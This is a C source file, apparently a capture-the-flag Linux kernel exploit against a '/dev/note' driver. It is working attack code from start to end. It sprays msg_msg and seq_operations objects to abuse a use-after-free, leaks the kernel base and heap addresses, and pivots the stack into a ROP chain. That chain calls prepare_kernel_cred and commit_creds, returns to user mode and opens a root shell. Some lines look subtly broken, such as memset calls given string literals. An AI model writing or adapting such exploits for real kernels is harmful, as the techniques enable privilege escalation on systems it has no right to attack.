#include <stdlib.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <string.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <stdint.h>
#include <sys/socket.h>

#define CMD_ADD  0xc12ed001
#define CMD_DELETE 0xc12ed002
#define CMD_EDIT  0xc12ed003
#define CMD_DUMP   0xc12ed004

int dev;
int qid;

/* Module struts */
typedef struct {
    unsigned size;
    char *data;
} notereq_t;

/* msg_req structs */
typedef struct {
    long mtype;
    char mtext[0x80];
} msg;

msg msgbuf;

struct msg_header {
    void *ll_next;
    void *ll_prev;
    long m_type;
    size_t m_ts;
    void *next;
    void *security;
} ;

/* Backup registers */
unsigned long bak_cs,bak_rflags,bak_ss,bak_rsp,bak_rip;

void bak(){
	__asm__(
		".intel_syntax noprefix;"
        "mov bak_cs, cs;"
        "mov bak_ss, ss;"
        "mov bak_rsp, rsp;"
        "pushf;"
        "pop bak_rflags;"
        ".att_syntax;"		
	);
	puts("[+]Registers backed up");
}

/* Helper functions */
void debug(){
    puts("paused execution");
    getchar();
}

int open_msg(){
    qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
}

int msgsend(int qid, void* msg, size_t size, int flag) {
    int res;

    if ((res = msgsnd(qid, msg, size, flag)) == -1) {
        perror("msgsnd");
        exit(-1);
    }
    return res;
}

void open_dev(){
    dev = open("/dev/note",O_RDWR);
    puts("[+]Interacting with device");
}

void add(unsigned size){
    notereq_t req = {
        .size = size,
        .data = NULL
    };
    ioctl(dev,CMD_ADD,&req);
}

void delete(){
    notereq_t req = {
        .size = 0,
        .data = NULL
    };
    ioctl(dev,CMD_DELETE,&req);
}

void edit(unsigned size, char *data){
    notereq_t req = {
        .size = size,
        .data = data
    };
    ioctl(dev,CMD_EDIT,&req);
}

char dump(unsigned size, char *data){
    notereq_t req = {
        .size = size,
        .data = data
    };
    char ret_data[size];
    ioctl(dev,CMD_DUMP,&req);
    return *ret_data;
}

void bin_sh(){
    printf("[+]UID: %d\n",getuid());
    system("/bin/sh");
}
unsigned long bak_rip = (unsigned long)bin_sh;

int main(){
    char payload[0x80];
    int target;
    unsigned long kleak[10], kbase, kheap, prepare_kernel_cred, commit_creds;

    memset(payload,"0",0x80);
    open_dev();
    bak();

    /* msg_msg spray 0x80 slab */
    open_msg();
    msgbuf.mtype = 1;
    memset(msgbuf.mtext,"A",sizeof(msgbuf.mtext));
    for (int i = 0; i < 0x21; i++){
        msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0);
    }

    /* seq_operations spray 0x20 slab */
    for(int i = 0; i < 0x80; i++) {
        open("/proc/self/stat", O_RDONLY);
    }

    /* Leak kernel w/ subprocess_info */
    add(0x80);
    edit(0x80,payload);
    delete();
    msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0);
    add(0x80);
    socket(22, AF_INET, 0);
    dump(0x80, (void *)kleak);
    kheap = kleak[1];
    kbase = kleak[3] - 0x060160;
    prepare_kernel_cred = kbase + 0x69e00;
    commit_creds = kbase + 0x69c10;
    printf("[+]Base: 0x%lx\n", kbase);
    printf("[+]Heap: 0x%lx\n", kheap);

    /* Control RIP w/ seq_operations */
    memset(payload,"0",0x80);
    delete();
    add(0x20);
    edit(0x20,payload);
    delete();
    open("/proc/self/stat", O_RDONLY);
    add(0x20);
    target = open("/proc/self/stat", O_RDONLY);

    /* ROP chain */
    unsigned long *rop = (unsigned long*)
        mmap((void*)(0x5d000000-0x100), 0x10000,
            PROT_READ | PROT_WRITE,
            0x20 | MAP_ANON | MAP_SHARED | MAP_POPULATE, -1, 0);

    rop = 0x5d000010;
    *rop++ = kbase + 0x038bf9;      // pop rdi; dec ecx; ret
    *rop++ = 0;
    *rop++ = prepare_kernel_cred;
    *rop++ = kbase + 0x0368fa;      // pop rcx; ret 
    *rop++ = 0;
    *rop++ = kbase + 0x01877f;      // mov rdi, rax; pop rbp; ret
    *rop++ = 0;
    *rop++ = commit_creds;
    *rop++ = kbase + 0x03ef24;      // swapgs; pop rbp; ret
    *rop++ = 0;
    *rop++ = kbase + 0x01d5c6;      // iretq; pop rbp; ret
    *rop++ = bak_rip;
    *rop++ = bak_cs;
    *rop++ = bak_rflags;
    *rop++ = bak_rsp;
    *rop++ = bak_ss;
    *rop++ = 0;

    /* Trigger ROP */
    *(unsigned long *)payload = kbase + 0x02cae0; // mov esp, 0x5d000010; ret
    edit(0x8,payload);
    read(target, payload, 1);

    return 0;
}